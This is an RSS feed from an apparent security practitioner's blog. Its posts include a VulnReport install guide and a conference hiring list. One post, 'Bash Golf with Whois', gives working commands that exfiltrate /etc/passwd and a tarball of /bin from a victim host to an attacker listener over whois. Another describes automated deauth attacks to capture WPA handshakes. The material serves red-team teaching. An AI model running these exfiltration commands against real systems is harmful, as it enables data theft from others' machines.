<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>malicious.link</title>
    <link>https://malicious.link/</link>
    <description>Recent content on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 23 May 2019 09:30:44 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>RSS Feed Fix</title>
      <link>https://malicious.link/post/2019/rss-feed-fix/</link>
      <pubDate>Thu, 23 May 2019 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2019/rss-feed-fix/</guid>
      <description>&lt;p&gt;Unfortunately the updated theme broke my RSS feed. I think I have it fixed so that it correctly links to the site but I am still having issues with it. If you wish to subscribe to this blog I would highly recommend using the FeedBurner link. The one on the site has changed over 10 years many times while the FeedBurner link never does. I keep updating what URL the FeedBurner link points to when I switch platforms. Apologize for the issues and linking currently going on.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;RSS Feed: &lt;a href=&#34;https://malicious.link/index.xml&#34;&gt;https://malicious.link/index.xml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;FeedBurner Link: &lt;a href=&#34;https://feeds.feedburner.com/Room362com&#34;&gt;https://feeds.feedburner.com/Room362com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Bash Golf with Whois</title>
      <link>https://malicious.link/post/2019/bash-golf-with-whois/</link>
      <pubDate>Mon, 20 May 2019 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2019/bash-golf-with-whois/</guid>
      <description>

&lt;p&gt;If you have never played Code Golf before, the essential idea is that you take a programming goal, such as &amp;ldquo;&lt;a href=&#34;https://code-golf.io/prime-numbers&#34;&gt;Print all prime numbers from 1 to 100&lt;/a&gt;&amp;rdquo;, and then try to do so in the most efficient / least amount of lines possible.&lt;/p&gt;

&lt;p&gt;There is a great website where these challenges can be found: &lt;a href=&#34;https://code-golf.io/&#34;&gt;https://code-golf.io/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I enjoy playing code golf, so when I saw the following tweet, I had to try it out:&lt;/p&gt;

&lt;p&gt;The tweet 1102558893513687040 from &lt;a href=&#34;https://twitter.com/Kevin2600&#34;&gt;@Kevin2600&lt;/a&gt; was deleted but it had the following commands in the image: (making up an IP since it was blacked out):&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Victim&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;whois -h 10.110.10.81 -p 4444 `cat /etc/passwd | base64`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Attacker&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;nc -l -p 4444
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, a lot of respondents mentioned that you could use the &lt;code&gt;/dev/tcp&lt;/code&gt; method or &lt;code&gt;awk&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet&#34; data-conversation=&#34;none&#34; data-lang=&#34;en&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Why whois?&lt;br&gt;&lt;br&gt;TCP&lt;a href=&#34;https://t.co/6UstTUeJ4M&#34;&gt;https://t.co/6UstTUeJ4M&lt;/a&gt;&lt;br&gt;&lt;br&gt;awk&lt;a href=&#34;https://t.co/QlCoAXFvKh&#34;&gt;https://t.co/QlCoAXFvKh&lt;/a&gt;&lt;br&gt;&lt;br&gt;Much easier and faster!&lt;/p&gt;&amp;mdash; Malwrologist (@DissectMalware) &lt;a href=&#34;https://twitter.com/DissectMalware/status/1102781062911066112?ref_src=twsrc%5Etfw&#34;&gt;March 5, 2019&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;While this is awesome and true, and for practicality should be used instead of &lt;code&gt;whois&lt;/code&gt;,  it is more about the mental stretch and exercise for me. You never know, there might a situation where you can&amp;rsquo;t use either of those and &lt;code&gt;whois&lt;/code&gt; is still there.&lt;/p&gt;

&lt;p&gt;This is the solution I came up with to both increase the file size limit, and add a bit of error correction:&lt;/p&gt;

&lt;p&gt;(Here is my reply: &lt;a href=&#34;https://twitter.com/mubix/status/1102780435271176198&#34;&gt;https://twitter.com/mubix/status/1102780435271176198&lt;/a&gt;)&lt;/p&gt;

&lt;h3 id=&#34;first-we-set-up-a-listener&#34;&gt;First we set up a listener:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;root@attackbox:~# ncat -k -l -p 4444 | tee files.b64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;tee&lt;/code&gt; is used to pipe the contents to a file as well as see it on the console so you can make sure you have it. You can substitute this with just &lt;code&gt;&amp;gt; files.b64&lt;/code&gt; if you wish.&lt;/p&gt;

&lt;p&gt;Options:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-k&lt;/code&gt;: means keep the connection open. We need this option as we are going to be doing many requests with &lt;code&gt;whois&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-l&lt;/code&gt;: listen on a port.. and&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p&lt;/code&gt;: what port to listen on&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;next-we-send-the-files-over-the-wire&#34;&gt;Next we send the files over the wire:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;root@victim:~# tar czf - /bin/* | base64 | xargs -I bits timeout 0.03 whois -h 192.168.80.107 -p 4444 bits
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Breakdown:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;tar czf - /bin/*&lt;/code&gt;: Create a &lt;code&gt;tar&lt;/code&gt; ball using compression(&lt;code&gt;c&lt;/code&gt;), and gzip(&lt;code&gt;z&lt;/code&gt;) to the file(&lt;code&gt;f&lt;/code&gt;) of standard output(&lt;code&gt;-&lt;/code&gt;) using all of the files in the &lt;code&gt;bin&lt;/code&gt; folder (&lt;code&gt;/bin/*&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;base64&lt;/code&gt;: Base64 encode that standard output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xargs -I bits&lt;/code&gt;: for every line do the following command while replacing the word &lt;code&gt;bits&lt;/code&gt; in the command with the contents of the preceding lines (from the base64)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;timeout 0.03&lt;/code&gt;: This times out the &lt;code&gt;whois&lt;/code&gt; command so that it closes the connection because there isn&amp;rsquo;t a response from the other end (it&amp;rsquo;s just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to &lt;code&gt;0.10&lt;/code&gt; or similar for doing things across the Internet.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;whois -h 192.168.80.107 -p 4444 bits&lt;/code&gt;: Send the &lt;code&gt;bits&lt;/code&gt;(which is replaced with the base64 line) &lt;code&gt;whois&lt;/code&gt; query to &lt;code&gt;192.168.80.107&lt;/code&gt; over port &lt;code&gt;4444&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;What you should see on the attacker side is a bunch of Base64 lines scrolling across the screen.&lt;/p&gt;

&lt;h3 id=&#34;finally&#34;&gt;Finally:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;root@attackbox:~# cat files.b64 | tr -d &#39;\r\n&#39; | base64 -d | tar zxv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Breakdown:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat files.b64&lt;/code&gt;: print all the base64 lines to standard output&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tr -d &#39;\r\n&#39;&lt;/code&gt;: remove all the newlines and returns to make one long base64 line to decode&lt;/li&gt;
&lt;li&gt;&lt;code&gt;base64 -d&lt;/code&gt;: decode the base64 line&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tar zxv&lt;/code&gt;: &lt;code&gt;x&lt;/code&gt; extract the tar ball using &lt;code&gt;z&lt;/code&gt; gzip and be &lt;code&gt;v&lt;/code&gt; verbose about it.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;errors&#34;&gt;Errors:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;If you receive a &lt;code&gt;base64: invalid input&lt;/code&gt; when doing the final step it is most likely that your timeout was too fast and some of the lines didn&amp;rsquo;t transfer completely.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you&amp;rsquo;ll see below).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bin/bash
bin/brltty

gzip: stdin: invalid compressed data--format violated
tar: Unexpected EOF in archive
tar: Unexpected EOF in archive
tar: Error is not recoverable: exiting now
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;improvements&#34;&gt;Improvements:&lt;/h3&gt;

&lt;h4 id=&#34;speed&#34;&gt;Speed:&lt;/h4&gt;

&lt;p&gt;One improvement to the speed is the number of bytes you send with each &lt;code&gt;whois&lt;/code&gt; request, which is based on the line length of the base64 output with the &lt;code&gt;-w&lt;/code&gt; flag. I have been able to increase this to 255 without much trouble like so: &lt;code&gt;base64 -w255&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar czf - /bin/* | base64 -w255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Even with this speed up sending all of &lt;code&gt;/bin/&lt;/code&gt; took 98 minutes using a timeout of &lt;code&gt;0.20&lt;/code&gt;. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you&amp;rsquo;ll end up with corrupted data if you go too fast.&lt;/p&gt;

&lt;p&gt;Size of &lt;code&gt;/bin/&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@victim:~# du -h /bin/
13M     /bin/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Total time:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@victim:~# time tar czf - /bin/* | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits

real    98m7.673s
user    1m25.792s
sys     0m46.706s
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;encryption&#34;&gt;Encryption:&lt;/h4&gt;

&lt;p&gt;While adding encryption will add more complexity and size to the transfer it will ensure confidentiality of the data being transfered. Simply adding &lt;code&gt;openssl enc -e -aes256 -out -&lt;/code&gt; to the line before the &lt;code&gt;base64&lt;/code&gt; works to solve this (as long as you select a good password). You will also need a full TTY (interactive terminal) to do this as it will prompt you for a password twice.&lt;/p&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar czf - /bin/* | openssl enc -e -aes256 -out - | base64 -w 255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;challenge&#34;&gt;Challenge&lt;/h2&gt;

&lt;p&gt;Think you can make this more efficient? Add error correction? I would love to see tweets or comments stating where this can be improved using only built in binaries (no python/ruby/perl/awk). Let me know! I look forward to hearing from you.&lt;/p&gt;

&lt;h2 id=&#34;other-methods&#34;&gt;Other methods&lt;/h2&gt;

&lt;p&gt;For those looking for a lot more file uploads or other such exploitation techniques, check out &lt;a href=&#34;https://gtfobins.github.io/&#34;&gt;GTFOBins&lt;/a&gt; and in particular &lt;a href=&#34;https://gtfobins.github.io/#+file%20upload&#34;&gt;https://gtfobins.github.io/#+file%20upload&lt;/a&gt;. &lt;code&gt;whois&lt;/code&gt; is detailed here: &lt;a href=&#34;https://gtfobins.github.io/gtfobins/whois/&#34;&gt;https://gtfobins.github.io/gtfobins/whois/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>VulnReport Install</title>
      <link>https://malicious.link/post/2019/vulnreport-install/</link>
      <pubDate>Thu, 28 Feb 2019 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2019/vulnreport-install/</guid>
      <description>

&lt;p&gt;A co-worker referenced a pretty cool tool released by &lt;a href=&#34;https://twitter.com/SecureCloudDev&#34;&gt;@SalesForce&amp;rsquo;s security team&lt;/a&gt; called &amp;ldquo;&lt;a href=&#34;http://vulnreport.io&#34;&gt;VulnReport&lt;/a&gt;&amp;ldquo;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://vulnreport.io&#34;&gt;&lt;img src=&#34;https://malicious.link/images/2019/vulnreport_web.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I wanted to try it out so I checked out their Github report to start the install: &lt;a href=&#34;https://github.com/salesforce/vulnreport&#34;&gt;https://github.com/salesforce/vulnreport&lt;/a&gt; - but there really wasn&amp;rsquo;t much in the way of documentation on how to get it rolling unless you were deploying it to a Heroku app. I&amp;rsquo;m not really a fan of putting vulnerability information, especially Red Team findings into the cloud so I decided to deploy it locally. Here are the steps I went through to install it and get it up and running:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; I started with a Debian 9.3 ISO that I had on-hand, if you use another repo your mileage may vary.&lt;/p&gt;

&lt;h4 id=&#34;install-dependancies&#34;&gt;Install dependancies:&lt;/h4&gt;

&lt;p&gt;This project uses Ruby, and many of the gems needed for the project require compiling in libraries.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;apt install -y git ruby ruby-dev ruby-bundler build-essential libssl-dev libpq-dev zlib1g-dev postgresql-server-dev-all authbind&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Next we install a Redis and Postgres server. If you already have these on the system or wish to use an established server on another systems you can most definitely do that instead of this step.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;apt install -y redis-server postgresql&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;setup-database&#34;&gt;Setup Database&lt;/h4&gt;

&lt;p&gt;Next we just need to create the database and user we will be using for the database:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:~# su - postgres
postgres@vulnreportio:~$ createuser -P vulnreportuser
Enter password for new role: vulnreportpassword (NOT DISPLAYED)
Enter it again: vulnreportpassword (NOT DISPLAYED)
postgres@vulnreportio:~$ createdb -O vulnreportuser vulnreportdb
postgres@vulnreportio:~$ exit
logout
root@vulnreportio:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;clone-the-repo&#34;&gt;Clone the repo&lt;/h4&gt;

&lt;p&gt;Toss the repo in &lt;code&gt;/opt/&lt;/code&gt; so that we can run this under another user to better secure it later but just for example we&amp;rsquo;ll get this running as &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:~# cd /opt/
root@vulnreportio:/opt# git clone https://github.com/salesforce/vulnreport
Cloning into &#39;vulnreport&#39;...
remote: Enumerating objects: 1191, done.
remote: Total 1191 (delta 0), reused 0 (delta 0), pack-reused 1191
Receiving objects: 100% (1191/1191), 2.93 MiB | 3.92 MiB/s, done.
Resolving deltas: 100% (694/694), done.
root@vulnreportio:/opt# cd vulnreport/
root@vulnreportio:/opt/vulnreport#
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;setup-ruby&#34;&gt;Setup Ruby&lt;/h4&gt;

&lt;p&gt;At the current version the Ruby version is fixed to &lt;code&gt;2.1.2&lt;/code&gt; but works just fine with later versions so you can remove the fixed Ruby version in the &lt;code&gt;Gemfile&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:/opt/vulnreport# bundle install
Don&#39;t run Bundler as root. Bundler can ask for sudo if it is needed, and installing your bundle as root will break this application for all non-root users on this machine.
Your Ruby version is 2.3.3, but your Gemfile specified 2.1.2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just comment out the line and things should work:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2019/vulnreport_gemfile.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:/opt/vulnreport# bundle install
Don&#39;t run Bundler as root. Bundler can ask for sudo if it is needed, and installing your bundle as root will break this application for all non-root users on this
machine.
Fetching gem metadata from https://rubygems.org/..............
Fetching version metadata from https://rubygems.org/...
Fetching dependency metadata from https://rubygems.org/..
Installing i18n 0.7.0
Using json 1.8.3
Installing minitest 5.8.4
Installing thread_safe 0.3.5
Installing addressable 2.4.0
Installing builder 3.2.2
Installing mini_portile2 2.0.0
Installing bcrypt 3.1.11 with native extensions
Installing chronic 0.10.2
Installing daemons 1.2.3
Installing fastercsv 1.5.5
Installing json_pure 1.8.3
Installing multi_json 1.11.3
Installing stringex 1.5.1
Installing uuidtools 2.1.5
Installing dotenv 2.1.1
Installing eventmachine 1.0.7 with native extensions
Installing multi_xml 0.5.5
Installing rack 1.6.4
Installing systemu 2.6.5
Installing mime-types-data 3.2016.0221
Installing multipart-post 2.0.0
Installing nori 2.6.0
Installing oauth 0.5.1
Installing pdfkit 0.8.2
Installing pg 0.18.4 with native extensions
Installing redis 3.3.0
Installing rubyzip 1.2.0
Installing rufus-scheduler 3.2.0
Installing tilt 2.0.2
Installing wkhtmltopdf-heroku 2.12.3.0
Installing xml-simple 1.1.5
Installing yard 0.8.7.6
Installing yard-dm 0.1.1
Using bundler 1.13.6
Installing tzinfo 1.2.2
Installing dm-core 1.2.1
Installing data_objects 0.10.17
Installing gyoku 1.3.1
Installing nokogiri 1.6.7.2 with native extensions
Installing bcrypt-ruby 3.1.5
Installing rollbar 2.10.0
Installing httparty 0.13.7
Installing httpi 2.4.1
Installing rack-protection 1.5.3
Installing rack-ssl 1.4.1
Installing rack_csrf 2.5.0
Installing thin 1.6.4 with native extensions
Installing macaddr 1.7.1
Installing mime-types 3.0
Installing rforce 0.13
Installing yard-sinatra 1.0.0
Installing activesupport 4.2.6
Installing dm-aggregates 1.2.0
Installing dm-constraints 1.2.0
Installing dm-migrations 1.2.0
Installing dm-serializer 1.2.2
Installing dm-timestamps 1.2.0
Installing dm-transactions 1.2.0
Installing dm-validations 1.2.0
Installing dm-do-adapter 1.2.0
Installing do_postgres 0.10.17 with native extensions
Installing akami 1.3.1
Installing dm-types 1.2.2
Installing wasabi 3.5.0
Installing sinatra 1.4.7
Installing uuid 2.3.8
Installing mail 2.6.4
Installing dm-postgres-adapter 1.2.0
Installing data_mapper 1.2.0
Installing savon 2.11.1
Installing ruby-saml 1.0.0
Installing pony 1.11
Bundle complete! 29 Gemfile dependencies, 73 gems now installed.
Use `bundle show [gemname]` to see where a bundled gem is installed.
Post-install message from bcrypt-ruby:

#######################################################

The bcrypt-ruby gem has changed its name to just bcrypt.  Instead of
installing `bcrypt-ruby`, you should install `bcrypt`.  Please update your
dependencies accordingly.

#######################################################

Post-install message from httparty:
When you HTTParty, you must party hard!
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;configure-vulnreport&#34;&gt;Configure VulnReport&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Create a &lt;code&gt;.env&lt;/code&gt; file that looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;export RACK_ENV=production
export VR_SESSION_SECRET=ADD_RANDOM_STRING_HERE
export DATABASE_URL=postgres://vulnreportuser:vulnreportpassword@localhost:5432/vulnreportdb
export REDIS_URL=redis://localhost:6379/
export ROLLBAR_ACCESS_TOKEN=ROLLBARTOKEN
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2019/vulnreport_env.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Next we want to replace the &lt;code&gt;VR_SESSION_SECRET&lt;/code&gt; with a strong relatively random string. I used a &lt;code&gt;sha256&lt;/code&gt; hash of a OpenSSL random string. It&amp;rsquo;s definitely not perfect random but it&amp;rsquo;s in the good-enough realm that it would be very hard for someone to brute force it.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sed -i  &amp;quot;s/ADD_RANDOM_STRING_HERE/$(openssl rand -base64 32 | sha256sum | cut -d &#39; &#39; -f 1 )/&amp;quot; .env&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After we are done we&amp;rsquo;ll have something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:/opt/vulnreport# cat .env
export RACK_ENV=production
export VR_SESSION_SECRET=0e40e9367e35bc7f6f6a0e1966a8c108c87b7f6a60e96c119779ae3b1dc08352
export DATABASE_URL=postgres://vulnreportuser:vulnreportpassword@localhost:5432/vulnreportdb
export REDIS_URL=redis://localhost:6379/
export ROLLBAR_ACCESS_TOKEN=ROLLBARTOKEN
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;create-a-self-signed-cert&#34;&gt;Create a self-signed cert&lt;/h4&gt;

&lt;p&gt;VulnReport looks for it&amp;rsquo;s SSL certificate in the same directory as it&amp;rsquo;s started in and called &lt;code&gt;server.key&lt;/code&gt; so we create a self-signed certifcate in the same directory as the git repo:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:/opt/vulnreport# openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt

Generating a RSA private key
........+++++
.......................................................+++++
writing new private key to &#39;server.key&#39;
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter &#39;.&#39;, the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

root@vulnreportio:/opt/vulnreport# ls -alh server.*
-rw-r--r-- 1 root root 1.3K Feb 28 19:56 server.crt
-rw------- 1 root root 1.7K Feb 28 19:56 server.key
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Of course feel free to put in any information you wish in the certificate, I just went with the defaults to make it easy.&lt;/p&gt;

&lt;h4 id=&#34;start-vulnreport&#34;&gt;Start VulnReport&lt;/h4&gt;

&lt;p&gt;First we need to SEED the database with information and tables using the &lt;code&gt;SEED.rb&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:/opt/vulnreport# ruby SEED.rb


Vulnreport 3.0.3 seed script
WARNING: This script should be run ONCE immediately after deploying and then DELETED

Setting up Vulnreport now...

Setting up the PostgreSQL database...
        Done

Seeding the database...
        Done

User ID 1 created for you


ALL DONE! :)
Login to Vulnreport now and go through the rest of the settings!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then we can start up the application:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@vulnreportio:/opt/vulnreport# ./start.sh
Using rack adapter
[28/Feb/2019 19:59:02] WARNING: RUNNING IN DEVELOPMENT ENVIRONMENT
[28/Feb/2019 19:59:02] Dev environment: CRON JOBS SCHEDULER NOT ENABLED
[28/Feb/2019 19:59:02] VRCron Registered: Monthly Allocation Notification
[28/Feb/2019 19:59:02]  Type: cron, Schedule: 0 7 1 * *
[28/Feb/2019 19:59:02]  Cron registered as not enabled, did not schedule
[28/Feb/2019 19:59:02] VRCron Registered: Monthly Allocation Preset
[28/Feb/2019 19:59:02]  Type: cron, Schedule: 0 0 1 * *
[28/Feb/2019 19:59:02]  Cron registered as not enabled, did not schedule
Thin web server (v1.6.4 codename Gob Bluth)
Maximum connections set to 1024
Listening on 0.0.0.0:443, CTRL+C to stop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once it&amp;rsquo;s started, we can log in with the default user &lt;code&gt;admin&lt;/code&gt; and the default password &lt;code&gt;admin&lt;/code&gt; which is quite hilariously ironic for a vulnerability reporting platform. I think the SEED file should be updated to add a vulnerability report example including the default password for it&amp;rsquo;s own service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2019/vulnreport_start.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;There are quite a few bugs that I&amp;rsquo;ve run into that result in a &amp;lsquo;NulClass&amp;rsquo;. I think this is the result of lacking enough SEED data. But once you create a user, vuln, or whatever, you&amp;rsquo;ll get this error but the creat will go through and you only really see this error once per action type.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2019/vulnreport_nilclass.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Side note: I submitted this install guide as a short version to the repository itself because of the lacking installation steps here: &lt;a href=&#34;https://github.com/salesforce/vulnreport/pull/30&#34;&gt;https://github.com/salesforce/vulnreport/pull/30&lt;/a&gt; but they require you to sign a document before they will accept pull requests: &lt;a href=&#34;https://cla.salesforce.com/sign-cla&#34;&gt;https://cla.salesforce.com/sign-cla&lt;/a&gt;. I don&amp;rsquo;t really have time to look over that document nor do I want to spend the time to get a lawyer to do so, so I will leave it at making a blog post about how to install it and hope that is enough to help others get this installed.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2019 ShmooCon Hiring List</title>
      <link>https://malicious.link/post/2018/2019-shmoocon-hiring-list/</link>
      <pubDate>Sat, 15 Dec 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/2019-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2018 UNOFFICIAL &lt;a href=&#34;https://shmoocon.org/&#34;&gt;ShmooCon&lt;/a&gt; Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/I4sbeEpxMwNI6qn33&#34;&gt;https://goo.gl/forms/I4sbeEpxMwNI6qn33&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to the Hiring List Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1HnDVbXqQU74X8RyLdTPZ36ZPlbpXYk5ByO1uw55eWI0/&#34;&gt;https://docs.google.com/spreadsheets/d/1HnDVbXqQU74X8RyLdTPZ36ZPlbpXYk5ByO1uw55eWI0/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;3900&#34; width=&#34;1000&#34; src=&#34;https://docs.google.com/spreadsheets/d/e/2PACX-1vRQdjd_XkEwUH9ZavinpWRptb8VOlwtbFwrmDjEWs5qi4rBhbJbXXpGdx-oIC2sTgN9nw10pz_4hC-b/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Wifi Feature Request: WPA handshakes</title>
      <link>https://malicious.link/post/2018/wifi-feature-request-wpa-handshakes/</link>
      <pubDate>Sun, 14 Oct 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/wifi-feature-request-wpa-handshakes/</guid>
      <description>&lt;p&gt;I have a bit of a feature request for all wireless assessment tools out there:&lt;/p&gt;

&lt;p&gt;Many times before arriving on site for an assessment, I&amp;rsquo;ll know the ESSIDs of a target wireless network for a client. Getting channels and BSSIDs isn&amp;rsquo;t usually an option. Also, many times during the assessment I&amp;rsquo;m performing there are physical aspects to it, like guards or cameras, so sitting down in the lobby and typing out commands to De-auth that client or BSSID isn&amp;rsquo;t really great OPSEC. SO this is my ask:&lt;/p&gt;

&lt;p&gt;Please make a mode or setting where I can specify a ESSID ahead of time (so I am only targeting the client networks I know of) that I can just leave running on a RaspberryPI or other small device + wireless card in my backpack. This mode would then search for WPA-PSK APs with that name, find ones with clients on it by hopping, deauth and try to capture the handshake, but would then go-back to hopping after a few minutes if failing (as I&amp;rsquo;m probably walking around the inside and outside of the building). A nice to have would that it would then exclude that network from the list provided and move on. Possibly also going after the ones with the most clients in the list automatically would be a plus as well.&lt;/p&gt;

&lt;p&gt;The end result would be that I would have a couple WPA handshakes that I could then crack off-line just by walking around the building doing other things.&lt;/p&gt;

&lt;p&gt;The key to this whole thing is not to get stuck on a single BSSID or client, and be able to reliably move on to another channel, BSSID or target ESSID without interaction. Let the WPA Handshake Hunting begin!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Erlang Authenticated Remote Code Execution</title>
      <link>https://malicious.link/post/2018/erlang-arce/</link>
      <pubDate>Sat, 15 Sep 2018 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2018/erlang-arce/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;http://erlang.org/faq/introduction.html&#34;&gt;Erlang is a programming language&lt;/a&gt; that I have tried to learn a few times in the past but never really dug in, that is, until recently.&lt;/p&gt;

